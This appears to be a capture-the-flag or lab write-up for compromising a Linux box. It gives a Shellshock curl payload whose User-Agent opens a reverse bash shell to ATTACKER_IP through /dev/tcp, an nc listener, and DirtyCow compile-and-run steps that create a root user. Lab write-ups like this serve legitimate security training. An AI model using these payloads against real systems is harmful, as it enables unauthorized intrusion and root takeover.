
## Box : 192.168.180.87/

## Nmap Scan
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp open  http    Apache httpd 2.2.22 (Ubuntu)
```

## Shellshock Vulnerability
Nikto identifies `/cgi-bin/test` as Shellshock‑vulnerable:
```text
/cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability. (CVE-2014-6271)
/cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability. (CVE-2014-6278)
```

### Initial Foothold
1. **Run listener** on your machine:
   ```bash
   nc -lvnp 4444
   ```
2. **Exploit Shellshock** using a crafted User-Agent:
   ```bash
   curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \
     http://192.168.180.87/cgi-bin/test
   ```
3. **Got shell** as \`www-data\`.

## Privilege Escalation: DirtyCow (CVE-2016-5195)
- **OS:** Ubuntu 12.04 LTS (kernel vulnerable to DirtyCow).

### Steps to root
```bash
# Ensure gcc is in PATH
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8
```
# Compile DirtyCow exploit
```bash
gcc -pthread dirty.c -o dirty -lcrypt
```
# Run exploit to add root user 'firefart'
./dirty

# Login as new user
su firefart
# Password: password
whoami
# root
